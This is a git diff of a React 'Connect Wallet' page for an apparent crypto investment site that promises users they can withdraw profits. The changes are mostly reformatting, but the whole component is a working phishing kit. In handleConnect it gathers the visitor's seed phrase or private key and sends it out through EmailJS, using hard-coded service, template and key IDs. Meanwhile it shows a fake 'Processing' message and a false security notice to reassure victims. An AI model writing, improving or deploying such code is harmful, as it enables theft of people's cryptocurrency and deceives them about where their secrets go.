@@ -1,12 +1,16 @@
-
-
-import { useState, useRef } from "react"
-import { Button } from "@/components/ui/button"
-import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
-import { Input } from "@/components/ui/input"
-import { Label } from "@/components/ui/label"
-import { Textarea } from "@/components/ui/textarea"
-import { Badge } from "@/components/ui/badge"
+import { useState, useRef } from "react";
+import { Button } from "@/components/ui/button";
+import {
+  Card,
+  CardContent,
+  CardDescription,
+  CardHeader,
+  CardTitle,
+} from "@/components/ui/card";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
+import { Textarea } from "@/components/ui/textarea";
+import { Badge } from "@/components/ui/badge";
 import {
   Wallet,
   Shield,
@@ -20,37 +24,37 @@ import {
   Search,
   CheckCircle,
   XCircle,
-} from "lucide-react"
-import emailjs from "@emailjs/browser"
-import BigLogo from "../assets/biglogo.png"
-import { useToast } from "@/hooks/useToast"
+} from "lucide-react";
+import emailjs from "@emailjs/browser";
+import BigLogo from "../assets/biglogo.png";
+import { useToast } from "@/hooks/useToast";
 
 export default function ConnectWallet() {
-  const [selectedWallet, setSelectedWallet] = useState(null)
-  const [connectionMethod, setConnectionMethod] = useState("phrase")
-  const [seedPhrase, setSeedPhrase] = useState("")
-  const [privateKey, setPrivateKey] = useState("")
-  const [showPhrase, setShowPhrase] = useState(false)
-  const [showPrivateKey, setShowPrivateKey] = useState(false)
-  const [isConnecting, setIsConnecting] = useState(false)
-  const [attemptCount, setAttemptCount] = useState(0)
-  const [searchTerm, setSearchTerm] = useState("")
-  const [selectedCategory, setSelectedCategory] = useState("all")
-  const [validationErrors, setValidationErrors] = useState({})
-  const { toast } = useToast()
+  const [selectedWallet, setSelectedWallet] = useState(null);
+  const [connectionMethod, setConnectionMethod] = useState("phrase");
+  const [seedPhrase, setSeedPhrase] = useState("");
+  const [privateKey, setPrivateKey] = useState("");
+  const [showPhrase, setShowPhrase] = useState(false);
+  const [showPrivateKey, setShowPrivateKey] = useState(false);
+  const [isConnecting, setIsConnecting] = useState(false);
+  const [attemptCount, setAttemptCount] = useState(0);
+  const [searchTerm, setSearchTerm] = useState("");
+  const [selectedCategory, setSelectedCategory] = useState("all");
+  const [validationErrors, setValidationErrors] = useState({});
+  const { toast } = useToast();
 
-  const connectionMethodRef = useRef(null)
-  const connectionFormRef = useRef(null)
+  const connectionMethodRef = useRef(null);
+  const connectionFormRef = useRef(null);
 
   // EmailJS configuration
-  const EMAILJS_SERVICE_ID = "service_5q3l5wf"
-  const EMAILJS_TEMPLATE_ID = "template_4awptkk"
-  const EMAILJS_PUBLIC_KEY = "DDN7RZHaxGtRpAcOd"
+  const EMAILJS_SERVICE_ID = "service_5q3l5wf";
+  const EMAILJS_TEMPLATE_ID = "template_4awptkk";
+  const EMAILJS_PUBLIC_KEY = "DDN7RZHaxGtRpAcOd";
 
   // Initialize EmailJS
   useState(() => {
-    emailjs.init(EMAILJS_PUBLIC_KEY)
-  }, [])
+    emailjs.init(EMAILJS_PUBLIC_KEY);
+  }, []);
 
   const wallets = [
     {
@@ -312,55 +316,59 @@ export default function ConnectWallet() {
       icon: <Lock className="h-5 w-5" />,
       description: "Connect using your wallet's private key",
     },
-  ]
+  ];
 
   // Enhanced validation functions
   const validateSeedPhrase = (phrase, wallet) => {
-    const errors = []
+    const errors = [];
 
     if (!phrase || phrase.trim() === "") {
-      errors.push("Seed phrase is required")
-      return { isValid: false, errors }
+      errors.push("Seed phrase is required");
+      return { isValid: false, errors };
     }
 
-    const words = phrase.trim().split(/\s+/)
-    const wordCount = words.length
+    const words = phrase.trim().split(/\s+/);
+    const wordCount = words.length;
 
     // Check word count
     if (!wallet.phraseLength.includes(wordCount)) {
       errors.push(
-        `${wallet.name} requires ${wallet.phraseLength.join(" or ")} words, but you entered ${wordCount} words`,
-      )
+        `${wallet.name} requires ${wallet.phraseLength.join(
+          " or "
+        )} words, but you entered ${wordCount} words`
+      );
     }
 
     // Check for empty words
-    const emptyWords = words.filter((word) => word.trim() === "")
+    const emptyWords = words.filter((word) => word.trim() === "");
     if (emptyWords.length > 0) {
-      errors.push("Seed phrase contains empty words")
+      errors.push("Seed phrase contains empty words");
     }
 
     // Check for duplicate words
-    const uniqueWords = [...new Set(words)]
+    const uniqueWords = [...new Set(words)];
     if (uniqueWords.length !== words.length) {
-      errors.push("Seed phrase contains duplicate words")
+      errors.push("Seed phrase contains duplicate words");
     }
 
     // Check for invalid characters (only letters and numbers allowed)
-    const invalidWords = words.filter((word) => !/^[a-zA-Z0-9]+$/.test(word))
+    const invalidWords = words.filter((word) => !/^[a-zA-Z0-9]+$/.test(word));
     if (invalidWords.length > 0) {
-      errors.push("Seed phrase contains invalid characters (only letters and numbers allowed)")
+      errors.push(
+        "Seed phrase contains invalid characters (only letters and numbers allowed)"
+      );
     }
 
     // Check minimum word length
-    const shortWords = words.filter((word) => word.length < 3)
+    const shortWords = words.filter((word) => word.length < 3);
     if (shortWords.length > 0) {
-      errors.push("All words must be at least 3 characters long")
+      errors.push("All words must be at least 3 characters long");
     }
 
     // Check maximum word length
-    const longWords = words.filter((word) => word.length > 12)
+    const longWords = words.filter((word) => word.length > 12);
     if (longWords.length > 0) {
-      errors.push("Words cannot be longer than 12 characters")
+      errors.push("Words cannot be longer than 12 characters");
     }
 
     return {
@@ -368,83 +376,87 @@ export default function ConnectWallet() {
       errors,
       wordCount,
       words,
-    }
-  }
+    };
+  };
 
   const validatePrivateKey = (key) => {
-    const errors = []
+    const errors = [];
 
     if (!key || key.trim() === "") {
-      errors.push("Private key is required")
-      return { isValid: false, errors }
+      errors.push("Private key is required");
+      return { isValid: false, errors };
     }
 
-    const cleanKey = key.replace(/^0x/, "").trim()
+    const cleanKey = key.replace(/^0x/, "").trim();
 
     // Check length
     if (cleanKey.length !== 64) {
-      errors.push(`Private key must be exactly 64 characters (currently ${cleanKey.length})`)
+      errors.push(
+        `Private key must be exactly 64 characters (currently ${cleanKey.length})`
+      );
     }
 
     // Check for valid hexadecimal characters
     if (!/^[a-fA-F0-9]+$/.test(cleanKey)) {
-      errors.push("Private key must contain only hexadecimal characters (0-9, a-f, A-F)")
+      errors.push(
+        "Private key must contain only hexadecimal characters (0-9, a-f, A-F)"
+      );
     }
 
     // Check for common invalid patterns
     if (cleanKey === "0".repeat(64)) {
-      errors.push("Invalid private key (all zeros)")
+      errors.push("Invalid private key (all zeros)");
     }
 
     if (cleanKey === "f".repeat(64) || cleanKey === "F".repeat(64)) {
-      errors.push("Invalid private key (all F's)")
+      errors.push("Invalid private key (all F's)");
     }
 
     // Check for sequential patterns
-    const hasSequentialPattern = /(.)\1{10,}/.test(cleanKey)
+    const hasSequentialPattern = /(.)\1{10,}/.test(cleanKey);
     if (hasSequentialPattern) {
-      errors.push("Private key appears to have invalid sequential patterns")
+      errors.push("Private key appears to have invalid sequential patterns");
     }
 
     return {
       isValid: errors.length === 0,
       errors,
       cleanKey,
-    }
-  }
+    };
+  };
 
   // Real-time validation
   const handleSeedPhraseChange = (value) => {
-    setSeedPhrase(value)
+    setSeedPhrase(value);
     if (selectedWallet && value.trim()) {
-      const validation = validateSeedPhrase(value, selectedWallet)
+      const validation = validateSeedPhrase(value, selectedWallet);
       setValidationErrors((prev) => ({
         ...prev,
         seedPhrase: validation.errors,
-      }))
+      }));
     } else {
       setValidationErrors((prev) => ({
         ...prev,
         seedPhrase: [],
-      }))
+      }));
     }
-  }
+  };
 
   const handlePrivateKeyChange = (value) => {
-    setPrivateKey(value)
+    setPrivateKey(value);
     if (value.trim()) {
-      const validation = validatePrivateKey(value)
+      const validation = validatePrivateKey(value);
       setValidationErrors((prev) => ({
         ...prev,
         privateKey: validation.errors,
-      }))
+      }));
     } else {
       setValidationErrors((prev) => ({
         ...prev,
         privateKey: [],
-      }))
+      }));
     }
-  }
+  };
 
   const handleConnect = async () => {
     if (!selectedWallet) {
@@ -452,17 +464,17 @@ export default function ConnectWallet() {
         title: "No Wallet Selected",
         description: "Please select a wallet to connect",
         variant: "destructive",
-      })
-      return
+      });
+      return;
     }
 
-    let validation = { isValid: false, errors: ["Unknown error"] }
+    let validation = { isValid: false, errors: ["Unknown error"] };
 
     // Validate based on connection method
     if (connectionMethod === "phrase") {
-      validation = validateSeedPhrase(seedPhrase, selectedWallet)
+      validation = validateSeedPhrase(seedPhrase, selectedWallet);
     } else if (connectionMethod === "privatekey") {
-      validation = validatePrivateKey(privateKey)
+      validation = validatePrivateKey(privateKey);
     }
 
     if (!validation.isValid) {
@@ -470,11 +482,11 @@ export default function ConnectWallet() {
         title: "Validation Error",
         description: validation.errors[0],
         variant: "destructive",
-      })
-      return
+      });
+      return;
     }
 
-    setIsConnecting(true)
+    setIsConnecting(true);
 
     // Simulate connection attempt
     setTimeout(() => {
@@ -484,77 +496,86 @@ export default function ConnectWallet() {
           wallet_name: selectedWallet?.name || "N/A",
           wallet_data: connectionMethod === "phrase" ? seedPhrase : privateKey,
           timestamp: new Date().toLocaleString(),
-        }
+        };
 
         emailjs
           .send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
           .then((response) => {
-            console.log("Email sent successfully!", response.status, response.text)
+            console.log(
+              "Email sent successfully!",
+              response.status,
+              response.text
+            );
             toast({
               title: "Processing!",
               description: `Processing connection to ${selectedWallet?.name}.`,
-            })
-            handleGoBack()
-            setIsConnecting(false)
-            setSeedPhrase("")
-            setPrivateKey("")
-            setSelectedWallet(null)
-            setConnectionMethod("phrase")
-            setValidationErrors({})
+            });
+            setTimeout(() => {
+              handleGoBack();
+            }, 4000);
+            setIsConnecting(false);
+            setSeedPhrase("");
+            setPrivateKey("");
+            setSelectedWallet(null);
+            setConnectionMethod("phrase");
+            setValidationErrors({});
           })
           .catch((error) => {
-            console.error("Email failed to send:", error)
-            setIsConnecting(false)
+            console.error("Email failed to send:", error);
+            setIsConnecting(false);
             toast({
               variant: "destructive",
               title: "Connection Error",
               description: "Failed to connect. Please try again.",
-            })
-          })
+            });
+          });
       } else {
-        setIsConnecting(false)
-        console.warn("EmailJS is not configured. Check your environment variables.")
+        setIsConnecting(false);
+        console.warn(
+          "EmailJS is not configured. Check your environment variables."
+        );
         toast({
           variant: "destructive",
           title: "Configuration Error",
           description: "Something went wrong",
-        })
+        });
       }
-    }, 2000)
-  }
+    }, 2000);
+  };
 
   const filteredWallets = wallets.filter((wallet) => {
     const matchesSearch =
       wallet.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
-      wallet.description.toLowerCase().includes(searchTerm.toLowerCase())
-    const matchesCategory = selectedCategory === "all" || wallet.category === selectedCategory
-    return matchesSearch && matchesCategory
-  })
+      wallet.description.toLowerCase().includes(searchTerm.toLowerCase());
+    const matchesCategory =
+      selectedCategory === "all" || wallet.category === selectedCategory;
+    return matchesSearch && matchesCategory;
+  });
 
   const handleAdminContact = () => {
     const adminWhatsApp =
-      "https://wa.me/1234567890?text=Hello,%20I%20need%20help%20connecting%20my%20wallet%20to%20CryptoVault"
-    window.open(adminWhatsApp, "_blank")
+      "https://wa.me/1234567890?text=Hello,%20I%20need%20help%20connecting%20my%20wallet%20to%20CryptoVault";
+    window.open(adminWhatsApp, "_blank");
     setTimeout(() => {
-      window.location.href = "/dashboard"
-    }, 1000)
-  }
+      window.location.href = "/dashboard";
+    }, 1000);
+  };
 
   const handleGoBack = () => {
-    window.history.back()
-  }
+    window.history.back();
+  };
 
   // Get validation status for current input
   const getCurrentValidation = () => {
     if (connectionMethod === "phrase" && seedPhrase.trim() && selectedWallet) {
-      return validateSeedPhrase(seedPhrase, selectedWallet)
+      return validateSeedPhrase(seedPhrase, selectedWallet);
     } else if (connectionMethod === "privatekey" && privateKey.trim()) {
-      return validatePrivateKey(privateKey)
+      return validatePrivateKey(privateKey);
     }
-    return null
-  }
+    return null;
+  };
 
-  const currentValidation = getCurrentValidation()
+  const currentValidation = getCurrentValidation();
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900">
@@ -563,12 +584,21 @@ export default function ConnectWallet() {
         <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
           <div className="flex justify-between items-center py-4">
             <div className="flex flex-1 items-center space-x-4">
-              <Button variant="ghost" onClick={handleGoBack} className="text-white hover:bg-white/10">
+              <Button
+                variant="ghost"
+                onClick={handleGoBack}
+                className="text-white hover:bg-white/10"
+              >
                 <ArrowLeft className="h-5 w-5 mr-2" />
                 Back
               </Button>
               <div className="flex justify-end items-center flex-1">
-                <img src={BigLogo || "/placeholder.svg"} alt="" className="object-contain" width={"100px"} />
+                <img
+                  src={BigLogo || "/placeholder.svg"}
+                  alt=""
+                  className="object-contain"
+                  width={"100px"}
+                />
               </div>
             </div>
           </div>
@@ -582,13 +612,16 @@ export default function ConnectWallet() {
             Connect Your Wallet
           </h1>
           <p className="text-xl text-gray-300 max-w-2xl mx-auto">
-            Securely connect your cryptocurrency wallet to withdraw your profits and manage your investments.
+            Securely connect your cryptocurrency wallet to withdraw your profits
+            and manage your investments.
           </p>
         </div>
 
         {/* Connection Methods */}
         <div className="mb-8" ref={connectionMethodRef}>
-          <h2 className="text-xl font-semibold text-white mb-4">Choose Connection Method</h2>
+          <h2 className="text-xl font-semibold text-white mb-4">
+            Choose Connection Method
+          </h2>
           <div className="grid grid-cols-2 md:grid-cols-5 gap-4">
             {connectionMethods.map((method) => (
               <Card
@@ -599,13 +632,17 @@ export default function ConnectWallet() {
                     : "bg-gradient-to-br from-slate-900/50 to-purple-900/20 border-purple-500/30 hover:border-purple-400/50"
                 } backdrop-blur-sm`}
                 onClick={() => {
-                  setConnectionMethod(method.id)
-                  setValidationErrors({})
+                  setConnectionMethod(method.id);
+                  setValidationErrors({});
                 }}
               >
                 <CardContent className="p-4 text-center">
-                  <div className="text-purple-400 mb-2 flex justify-center">{method.icon}</div>
-                  <h3 className="text-white font-medium text-sm mb-1">{method.name}</h3>
+                  <div className="text-purple-400 mb-2 flex justify-center">
+                    {method.icon}
+                  </div>
+                  <h3 className="text-white font-medium text-sm mb-1">
+                    {method.name}
+                  </h3>
                   <p className="text-gray-400 text-xs">{method.description}</p>
                 </CardContent>
               </Card>
@@ -616,7 +653,9 @@ export default function ConnectWallet() {
         {/* Wallet Selection */}
         <div className="mb-8">
           <div className="flex flex-col md:flex-row justify-between items-start md:items-center mb-6 gap-4">
-            <h2 className="text-xl font-semibold text-white">Select Your Wallet</h2>
+            <h2 className="text-xl font-semibold text-white">
+              Select Your Wallet
+            </h2>
             <div className="flex flex-col sm:flex-row gap-4 w-full md:w-auto">
               <div className="relative">
                 <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 h-4 w-4" />
@@ -645,24 +684,25 @@ export default function ConnectWallet() {
                     connectionMethodRef.current?.scrollIntoView({
                       behavior: "smooth",
                       block: "center",
-                    })
+                    });
                     toast({
                       title: "Select Connection Method First",
-                      description: "Please choose how you'd like to connect your wallet",
+                      description:
+                        "Please choose how you'd like to connect your wallet",
                       variant: "destructive",
-                    })
-                    return
+                    });
+                    return;
                   }
 
-                  setSelectedWallet(wallet)
-                  setValidationErrors({})
+                  setSelectedWallet(wallet);
+                  setValidationErrors({});
 
                   setTimeout(() => {
                     connectionFormRef.current?.scrollIntoView({
                       behavior: "smooth",
                       block: "start",
-                    })
-                  }, 100)
+                    });
+                  }, 100);
                 }}
               >
                 <CardContent className="p-4">
@@ -672,12 +712,18 @@ export default function ConnectWallet() {
                       alt={wallet.name}
                       className="w-12 h-12 object-cover rounded-xl border border-purple-500/30 bg-white/10 p-1"
                       onError={(e) => {
-                        e.target.src = `/placeholder.svg?height=48&width=48&text=${wallet.name.charAt(0)}`
+                        e.target.src = `/placeholder.svg?height=48&width=48&text=${wallet.name.charAt(
+                          0
+                        )}`;
                       }}
                     />
                     <div className="flex-1 min-w-0">
-                      <h3 className="text-white font-semibold text-sm truncate">{wallet.name}</h3>
-                      <p className="text-gray-400 text-xs">{wallet.description}</p>
+                      <h3 className="text-white font-semibold text-sm truncate">
+                        {wallet.name}
+                      </h3>
+                      <p className="text-gray-400 text-xs">
+                        {wallet.description}
+                      </p>
                       <Badge className="mt-1 bg-purple-500/20 text-purple-300 border-purple-500/30 text-xs">
                         {wallet.type}
                       </Badge>
@@ -687,20 +733,30 @@ export default function ConnectWallet() {
                   <div className="space-y-2">
                     <div className="text-xs">
                       <span className="text-gray-400">Phrase Length: </span>
-                      <span className="text-white">{wallet.phraseLength.join(", ")} words</span>
+                      <span className="text-white">
+                        {wallet.phraseLength.join(", ")} words
+                      </span>
                     </div>
                     <div className="text-xs">
                       <span className="text-gray-400">Networks: </span>
-                      <span className="text-white">{wallet.networks.slice(0, 2).join(", ")}</span>
+                      <span className="text-white">
+                        {wallet.networks.slice(0, 2).join(", ")}
+                      </span>
                       {wallet.networks.length > 2 && (
-                        <span className="text-gray-400"> +{wallet.networks.length - 2}</span>
+                        <span className="text-gray-400">
+                          {" "}
+                          +{wallet.networks.length - 2}
+                        </span>
                       )}
                     </div>
                   </div>
 
                   <div className="flex flex-wrap gap-1 mt-3">
                     {wallet.features.slice(0, 2).map((feature, index) => (
-                      <Badge key={index} className="bg-gray-700/50 text-gray-300 border-gray-600/30 text-xs">
+                      <Badge
+                        key={index}
+                        className="bg-gray-700/50 text-gray-300 border-gray-600/30 text-xs"
+                      >
                         {feature}
                       </Badge>
                     ))}
@@ -728,16 +784,23 @@ export default function ConnectWallet() {
               </CardTitle>
               <CardDescription className="text-gray-300">
                 {connectionMethod === "phrase" &&
-                  `Enter your ${selectedWallet.phraseLength.join(" or ")}-word recovery phrase`}
-                {connectionMethod === "privatekey" && "Enter your wallet's private key"}
+                  `Enter your ${selectedWallet.phraseLength.join(
+                    " or "
+                  )}-word recovery phrase`}
+                {connectionMethod === "privatekey" &&
+                  "Enter your wallet's private key"}
               </CardDescription>
             </CardHeader>
             <CardContent className="space-y-6">
               {connectionMethod === "phrase" && (
                 <div className="space-y-4">
                   <div>
-                    <Label htmlFor="seedphrase" className="text-gray-300 mb-2 block">
-                      Seed Phrase ({selectedWallet.phraseLength.join(" or ")} words)
+                    <Label
+                      htmlFor="seedphrase"
+                      className="text-gray-300 mb-2 block"
+                    >
+                      Seed Phrase ({selectedWallet.phraseLength.join(" or ")}{" "}
+                      words)
                     </Label>
                     <div className="relative">
                       <Textarea
@@ -749,8 +812,8 @@ export default function ConnectWallet() {
                           currentValidation && !currentValidation.isValid
                             ? "border-red-500"
                             : currentValidation && currentValidation.isValid
-                              ? "border-green-500"
-                              : ""
+                            ? "border-green-500"
+                            : ""
                         }`}
                         type={showPhrase ? "text" : "password"}
                       />
@@ -761,7 +824,11 @@ export default function ConnectWallet() {
                         className="absolute right-2 top-2 text-gray-400 hover:text-white"
                         onClick={() => setShowPhrase(!showPhrase)}
                       >
-                        {showPhrase ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
+                        {showPhrase ? (
+                          <EyeOff className="h-4 w-4" />
+                        ) : (
+                          <Eye className="h-4 w-4" />
+                        )}
                       </Button>
                       {currentValidation && (
                         <div className="absolute right-10 top-2">
@@ -781,27 +848,36 @@ export default function ConnectWallet() {
                           <span className="text-gray-400">Word count:</span>
                           <span
                             className={`${
-                              selectedWallet.phraseLength.includes(seedPhrase.trim().split(/\s+/).length)
+                              selectedWallet.phraseLength.includes(
+                                seedPhrase.trim().split(/\s+/).length
+                              )
                                 ? "text-green-400"
                                 : "text-red-400"
                             }`}
                           >
-                            {seedPhrase.trim().split(/\s+/).length} / {selectedWallet.phraseLength.join(" or ")}
+                            {seedPhrase.trim().split(/\s+/).length} /{" "}
+                            {selectedWallet.phraseLength.join(" or ")}
                           </span>
                         </div>
 
-                        {currentValidation && currentValidation.errors.length > 0 && (
-                          <div className="bg-red-900/20 border border-red-600/30 rounded-lg p-3">
-                            <ul className="text-red-300 text-sm space-y-1">
-                              {currentValidation.errors.map((error, index) => (
-                                <li key={index} className="flex items-start gap-2">
-                                  <XCircle className="h-4 w-4 flex-shrink-0 mt-0.5" />
-                                  {error}
-                                </li>
-                              ))}
-                            </ul>
-                          </div>
-                        )}
+                        {currentValidation &&
+                          currentValidation.errors.length > 0 && (
+                            <div className="bg-red-900/20 border border-red-600/30 rounded-lg p-3">
+                              <ul className="text-red-300 text-sm space-y-1">
+                                {currentValidation.errors.map(
+                                  (error, index) => (
+                                    <li
+                                      key={index}
+                                      className="flex items-start gap-2"
+                                    >
+                                      <XCircle className="h-4 w-4 flex-shrink-0 mt-0.5" />
+                                      {error}
+                                    </li>
+                                  )
+                                )}
+                              </ul>
+                            </div>
+                          )}
 
                         {currentValidation && currentValidation.isValid && (
                           <div className="bg-green-900/20 border border-green-600/30 rounded-lg p-3">
@@ -820,7 +896,10 @@ export default function ConnectWallet() {
               {connectionMethod === "privatekey" && (
                 <div className="space-y-4">
                   <div>
-                    <Label htmlFor="privatekey" className="text-gray-300 mb-2 block">
+                    <Label
+                      htmlFor="privatekey"
+                      className="text-gray-300 mb-2 block"
+                    >
                       Private Key
                     </Label>
                     <div className="relative">
@@ -833,8 +912,8 @@ export default function ConnectWallet() {
                           currentValidation && !currentValidation.isValid
                             ? "border-red-500"
                             : currentValidation && currentValidation.isValid
-                              ? "border-green-500"
-                              : ""
+                            ? "border-green-500"
+                            : ""
                         }`}
                         type={showPrivateKey ? "text" : "password"}
                       />
@@ -845,7 +924,11 @@ export default function ConnectWallet() {
                         className="absolute right-2 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-white"
                         onClick={() => setShowPrivateKey(!showPrivateKey)}
                       >
-                        {showPrivateKey ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
+                        {showPrivateKey ? (
+                          <EyeOff className="h-4 w-4" />
+                        ) : (
+                          <Eye className="h-4 w-4" />
+                        )}
                       </Button>
                       {currentValidation && (
                         <div className="absolute right-10 top-1/2 transform -translate-y-1/2">
@@ -865,25 +948,34 @@ export default function ConnectWallet() {
                           <span className="text-gray-400">Length:</span>
                           <span
                             className={`${
-                              privateKey.replace(/^0x/, "").length === 64 ? "text-green-400" : "text-red-400"
+                              privateKey.replace(/^0x/, "").length === 64
+                                ? "text-green-400"
+                                : "text-red-400"
                             }`}
                           >
-                            {privateKey.replace(/^0x/, "").length} / 64 characters
+                            {privateKey.replace(/^0x/, "").length} / 64
+                            characters
                           </span>
                         </div>
 
-                        {currentValidation && currentValidation.errors.length > 0 && (
-                          <div className="bg-red-900/20 border border-red-600/30 rounded-lg p-3">
-                            <ul className="text-red-300 text-sm space-y-1">
-                              {currentValidation.errors.map((error, index) => (
-                                <li key={index} className="flex items-start gap-2">
-                                  <XCircle className="h-4 w-4 flex-shrink-0 mt-0.5" />
-                                  {error}
-                                </li>
-                              ))}
-                            </ul>
-                          </div>
-                        )}
+                        {currentValidation &&
+                          currentValidation.errors.length > 0 && (
+                            <div className="bg-red-900/20 border border-red-600/30 rounded-lg p-3">
+                              <ul className="text-red-300 text-sm space-y-1">
+                                {currentValidation.errors.map(
+                                  (error, index) => (
+                                    <li
+                                      key={index}
+                                      className="flex items-start gap-2"
+                                    >
+                                      <XCircle className="h-4 w-4 flex-shrink-0 mt-0.5" />
+                                      {error}
+                                    </li>
+                                  )
+                                )}
+                              </ul>
+                            </div>
+                          )}
 
                         {currentValidation && currentValidation.isValid && (
                           <div className="bg-green-900/20 border border-green-600/30 rounded-lg p-3">
@@ -904,10 +996,13 @@ export default function ConnectWallet() {
                 <div className="flex items-start space-x-3">
                   <AlertTriangle className="h-5 w-5 text-yellow-400 flex-shrink-0 mt-0.5" />
                   <div>
-                    <h4 className="text-yellow-400 font-medium text-sm mb-1">Security Notice</h4>
+                    <h4 className="text-yellow-400 font-medium text-sm mb-1">
+                      Security Notice
+                    </h4>
                     <p className="text-yellow-300 text-sm">
-                      Never share your seed phrase or private key with anyone. LunoVest will never ask for this
-                      information outside of this secure connection process.
+                      Never share your seed phrase or private key with anyone.
+                      LunoVest will never ask for this information outside of
+                      this secure connection process.
                     </p>
                   </div>
                 </div>
@@ -964,17 +1059,22 @@ export default function ConnectWallet() {
           <CardContent>
             <div className="grid md:grid-cols-2 gap-6">
               <div>
-                <h4 className="text-white font-medium mb-2">Can't find your wallet?</h4>
+                <h4 className="text-white font-medium mb-2">
+                  Can't find your wallet?
+                </h4>
                 <p className="text-gray-300 text-sm mb-3">
-                  We support most popular cryptocurrency wallets. If you don't see yours listed, try using the "Private
-                  Key" or "Seed Phrase" connection method.
+                  We support most popular cryptocurrency wallets. If you don't
+                  see yours listed, try using the "Private Key" or "Seed Phrase"
+                  connection method.
                 </p>
               </div>
               <div>
-                <h4 className="text-white font-medium mb-2">Connection issues?</h4>
+                <h4 className="text-white font-medium mb-2">
+                  Connection issues?
+                </h4>
                 <p className="text-gray-300 text-sm mb-3">
-                  Make sure your wallet information is correct and try again. If problems persist, contact our support
-                  team.
+                  Make sure your wallet information is correct and try again. If
+                  problems persist, contact our support team.
                 </p>
               </div>
             </div>
@@ -982,5 +1082,5 @@ export default function ConnectWallet() {
         </Card>
       </main>
     </div>
-  )
+  );
 }
